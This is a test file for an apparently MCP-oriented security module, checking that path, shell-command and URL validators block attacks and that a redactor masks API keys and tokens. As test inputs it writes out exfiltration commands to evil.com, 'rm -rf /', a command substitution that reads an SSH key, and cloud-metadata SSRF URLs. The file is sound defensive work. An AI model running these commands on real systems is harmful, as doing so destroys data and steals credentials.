/**
 * Security module tests — scenario-based, covering all 4 layers.
 *
 * Personas:
 *   - Mallory: Attacker trying to exfiltrate credentials via MCP tools
 *   - Alice: Legitimate user running builds, tests, git commands
 */

import { describe, it, expect, beforeEach } from "vitest";
import { safePath } from "../pathSandbox.js";
import { safeExec } from "../commandSandbox.js";
import { safeUrl, safeUrlWithDnsCheck } from "../urlValidator.js";
import { redactSecrets, _resetEnvSecretsForTesting } from "../credentialRedactor.js";
import { SecurityError } from "../SecurityError.js";
import {
  setSecurityConfig,
  _resetSecurityConfigForTesting,
} from "../config.js";
import * as os from "node:os";
import * as path from "node:path";

// ─── Setup ────────────────────────────────────────────────────────────────────

beforeEach(() => {
  _resetSecurityConfigForTesting();
  _resetEnvSecretsForTesting();
  setSecurityConfig({ mode: "strict", allowedRoots: [process.cwd()] });
});

// ═══════════════════════════════════════════════════════════════════════════════
// PATH SANDBOXING
// ═══════════════════════════════════════════════════════════════════════════════

describe("pathSandbox — Mallory tries to read secrets", () => {
  it("blocks ~/.ssh/id_rsa (SSH private key theft)", () => {
    expect(() => safePath("~/.ssh/id_rsa")).toThrow(SecurityError);
    expect(() => safePath("~/.ssh/id_rsa")).toThrow("PATH_SENSITIVE");
  });

  it("blocks ~/.aws/credentials (AWS key theft)", () => {
    expect(() => safePath("~/.aws/credentials")).toThrow(SecurityError);
  });

  it("blocks ~/.ethereum/keystore (wallet seed theft)", () => {
    expect(() => safePath("~/.ethereum/keystore/key.json")).toThrow(SecurityError);
  });

  it("blocks .env files regardless of location", () => {
    expect(() => safePath(".env")).toThrow(SecurityError);
    expect(() => safePath(".env.production")).toThrow(SecurityError);
    expect(() => safePath(".env.local")).toThrow(SecurityError);
  });

  it("blocks path traversal to parent directories", () => {
    expect(() => safePath("../../../../etc/passwd")).toThrow(SecurityError);
  });

  it("blocks absolute paths outside cwd", () => {
    const outsidePath = path.join(os.homedir(), "Desktop", "secrets.txt");
    expect(() => safePath(outsidePath)).toThrow(SecurityError);
  });

  it("blocks ~/.gnupg (GPG key theft)", () => {
    expect(() => safePath("~/.gnupg/private-keys-v1.d")).toThrow(SecurityError);
  });

  it("blocks wallet seed files by pattern", () => {
    expect(() => safePath("seed_phrase.txt")).toThrow(SecurityError);
    expect(() => safePath("mnemonic.json")).toThrow(SecurityError);
    expect(() => safePath("private_key.json")).toThrow(SecurityError);
  });
});

describe("pathSandbox — Alice uses legitimate file operations", () => {
  it("allows reading files within cwd", () => {
    const result = safePath("package.json");
    expect(result).toBe(path.resolve(process.cwd(), "package.json"));
  });

  it("allows reading nested files within cwd", () => {
    const result = safePath("src/index.ts");
    expect(result).toBe(path.resolve(process.cwd(), "src/index.ts"));
  });

  it("allows home directory access when explicitly opted in", () => {
    const result = safePath("~/Documents/notes.txt", { allowHome: true });
    expect(result).toBe(path.join(os.homedir(), "Documents", "notes.txt"));
  });

  it("allows temp directory when opted in", () => {
    const tmpFile = path.join(os.tmpdir(), "test.txt");
    const result = safePath(tmpFile, { allowTemp: true });
    expect(result).toBe(tmpFile);
  });

  it("allows files in custom roots", () => {
    const customRoot = path.resolve(process.cwd(), "test-sandbox");
    const testFile = path.join(customRoot, "data.csv");
    const result = safePath(testFile, {
      allowedRoots: [customRoot],
    });
    expect(result).toBe(testFile);
  });
});

describe("pathSandbox — permissive mode for testing", () => {
  beforeEach(() => setSecurityConfig({ mode: "permissive" }));

  it("allows all paths in permissive mode", () => {
    const result = safePath("~/.ssh/id_rsa");
    expect(result).toBe(path.join(os.homedir(), ".ssh", "id_rsa"));
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// COMMAND SANDBOXING
// ═══════════════════════════════════════════════════════════════════════════════

describe("commandSandbox — Mallory tries injection attacks", () => {
  it("blocks arbitrary commands not on allow-list", () => {
    expect(() => safeExec("rm -rf /")).toThrow(SecurityError);
    expect(() => safeExec("rm -rf /")).toThrow("EXEC_BLOCKED");
  });

  it("blocks shell metacharacter injection via semicolons", () => {
    expect(() => safeExec("git status; curl evil.com")).toThrow(SecurityError);
    expect(() => safeExec("git status; curl evil.com")).toThrow("EXEC_METACHAR");
  });

  it("blocks command substitution with $()", () => {
    expect(() => safeExec("git log $(cat ~/.ssh/id_rsa)")).toThrow(SecurityError);
  });

  it("blocks backtick injection", () => {
    expect(() => safeExec("git log `whoami`")).toThrow(SecurityError);
  });

  it("blocks && chaining", () => {
    expect(() => safeExec("git status && curl evil.com")).toThrow(SecurityError);
  });

  it("blocks || chaining", () => {
    expect(() => safeExec("git status || rm -rf /")).toThrow(SecurityError);
  });

  it("blocks redirect to overwrite files", () => {
    expect(() => safeExec("echo pwned > /etc/passwd")).toThrow(SecurityError);
  });

  it("blocks pipes unless explicitly allowed", () => {
    expect(() => safeExec("cat file | nc evil.com 1234")).toThrow(SecurityError);
  });

  it("allows pipes when opt-in", () => {
    // This will fail on exec (cat file doesn't exist) but shouldn't throw SecurityError
    const result = safeExec("cat package.json", { allowPipes: false });
    // cat is on the allow-list, and no pipe — should execute (may fail but not SecurityError)
    expect(result.exitCode).toBeDefined();
  });
});

describe("commandSandbox — Alice runs legitimate commands", () => {
  it("allows git commands", () => {
    const result = safeExec("git status");
    expect(result.exitCode).toBeDefined();
    expect(typeof result.stdout).toBe("string");
  });

  it("allows npm commands", () => {
    const result = safeExec("npm --version");
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toMatch(/\d+\.\d+/);
  });

  it("allows node commands", () => {
    const result = safeExec("node --version");
    expect(result.exitCode).toBe(0);
  });

  it("caps timeout at configured max", () => {
    setSecurityConfig({ maxExecTimeoutMs: 5000 });
    // Even if user asks for 999s, it should be capped
    const result = safeExec("echo hello", { timeout: 999_000 });
    expect(result.exitCode).toBe(0);
    expect(result.durationMs).toBeLessThan(5000);
  });

  it("allows ls/dir for directory listing", () => {
    const cmd = process.platform === "win32" ? "dir" : "ls";
    const result = safeExec(cmd);
    expect(result.exitCode).toBeDefined();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// URL VALIDATION
// ═══════════════════════════════════════════════════════════════════════════════

describe("urlValidator — Mallory tries SSRF attacks", () => {
  it("blocks file:// scheme", () => {
    expect(() => safeUrl("file:///etc/passwd")).toThrow(SecurityError);
    expect(() => safeUrl("file:///etc/passwd")).toThrow("URL_BAD_SCHEME");
  });

  it("blocks gopher:// scheme", () => {
    expect(() => safeUrl("gopher://localhost:27017")).toThrow(SecurityError);
  });

  it("blocks AWS metadata endpoint (169.254.169.254)", () => {
    expect(() => safeUrl("http://169.254.169.254/latest/meta-data/")).toThrow(SecurityError);
    expect(() => safeUrl("http://169.254.169.254/latest/meta-data/")).toThrow("URL_PRIVATE_IP");
  });

  it("blocks localhost", () => {
    expect(() => safeUrl("http://localhost:8080/admin")).toThrow(SecurityError);
  });

  it("blocks private IPs (10.x)", () => {
    expect(() => safeUrl("http://10.0.0.1/internal")).toThrow(SecurityError);
  });

  it("blocks private IPs (192.168.x)", () => {
    expect(() => safeUrl("http://192.168.1.1/router")).toThrow(SecurityError);
  });

  it("blocks private IPs (172.16-31.x)", () => {
    expect(() => safeUrl("http://172.16.0.1/internal")).toThrow(SecurityError);
  });

  it("blocks Google Cloud metadata", () => {
    expect(() => safeUrl("http://metadata.google.internal/computeMetadata/v1/")).toThrow(SecurityError);
  });

  it("blocks 127.0.0.1", () => {
    expect(() => safeUrl("http://127.0.0.1:6276/admin")).toThrow(SecurityError);
  });
});

describe("urlValidator — Alice fetches public URLs", () => {
  it("allows https://", () => {
    const result = safeUrl("https://api.github.com/repos/test");
    expect(result).toBe("https://api.github.com/repos/test");
  });

  it("allows http:// to public IPs", () => {
    const result = safeUrl("http://example.com/data.json");
    expect(result).toBe("http://example.com/data.json");
  });

  it("allows private IPs when explicitly opted in (internal services)", () => {
    const result = safeUrl("http://localhost:8006/health", { allowPrivate: true });
    expect(result).toBe("http://localhost:8006/health");
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// CREDENTIAL REDACTION
// ═══════════════════════════════════════════════════════════════════════════════

describe("credentialRedactor — prevents secret leaks in tool outputs", () => {
  it("redacts OpenAI API keys", () => {
    const output = 'Using key: sk-abcdefghijklmnopqrstuvwxyz1234567890';
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:OPENAI_KEY]");
    expect(result).not.toContain("sk-abcdefghijklmnop");
  });

  it("redacts GitHub PATs", () => {
    const output = "token: ghp_abcdefghijklmnopqrstuvwxyz1234567890";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:GITHUB_PAT]");
  });

  it("redacts AWS access keys", () => {
    const output = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:AWS_ACCESS_KEY]");
  });

  it("redacts private key headers", () => {
    const output = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIB...";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:PRIVATE_KEY]");
  });

  it("redacts npm tokens", () => {
    const output = "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz1234567890";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:NPM_TOKEN]");
  });

  it("redacts Google API keys", () => {
    const output = "key=AIzaSyBcdefghijklmnopqrstuvwxyz12345678";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:GOOGLE_API_KEY]");
  });

  it("redacts Bearer tokens", () => {
    const output = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:BEARER_TOKEN]");
  });

  it("redacts password=value patterns", () => {
    const output = 'password: "mySuperSecretPassword123"';
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:CREDENTIAL]");
  });

  it("redacts dynamic env var values", () => {
    // Simulate an env var with a secret
    const originalValue = process.env.TEST_SECRET_KEY;
    process.env.TEST_SECRET_KEY = "my-dynamic-secret-value-123";
    _resetEnvSecretsForTesting();

    const output = "The token is my-dynamic-secret-value-123 in the output";
    const result = redactSecrets(output);
    expect(result).toContain("[REDACTED:ENV_VALUE]");
    expect(result).not.toContain("my-dynamic-secret-value-123");

    // Cleanup
    if (originalValue === undefined) {
      delete process.env.TEST_SECRET_KEY;
    } else {
      process.env.TEST_SECRET_KEY = originalValue;
    }
    _resetEnvSecretsForTesting();
  });

  it("leaves non-secret text untouched", () => {
    const output = "Build completed successfully in 3.2s. 42 tests passed.";
    const result = redactSecrets(output);
    expect(result).toBe(output);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// INTEGRATION: Combined attack scenarios
// ═══════════════════════════════════════════════════════════════════════════════

describe("integration — multi-layer attack prevention", () => {
  it("Mallory chains path traversal + shell injection: both blocked", () => {
    // Try to read secrets via path — blocked by pathSandbox
    expect(() => safePath("~/.ssh/id_rsa")).toThrow(SecurityError);
    // Try to exfil via shell with chaining — blocked by metachar detection
    expect(() => safeExec("cat ~/.ssh/id_rsa && curl evil.com")).toThrow(SecurityError);
  });

  it("Mallory tries SSRF to cloud metadata + exfil via chained command", () => {
    expect(() => safeUrl("http://169.254.169.254/latest/meta-data/")).toThrow(SecurityError);
    // Shell injection via chaining is blocked even if curl is allowed
    expect(() => safeExec("curl http://169.254.169.254; cat /etc/passwd")).toThrow(SecurityError);
  });

  it("even if a secret leaks into output, redaction catches it", () => {
    const simulatedLeak = "Found key: sk-abcdef1234567890abcdef1234 in config";
    const result = redactSecrets(simulatedLeak);
    expect(result).not.toContain("sk-abcdef");
  });
});
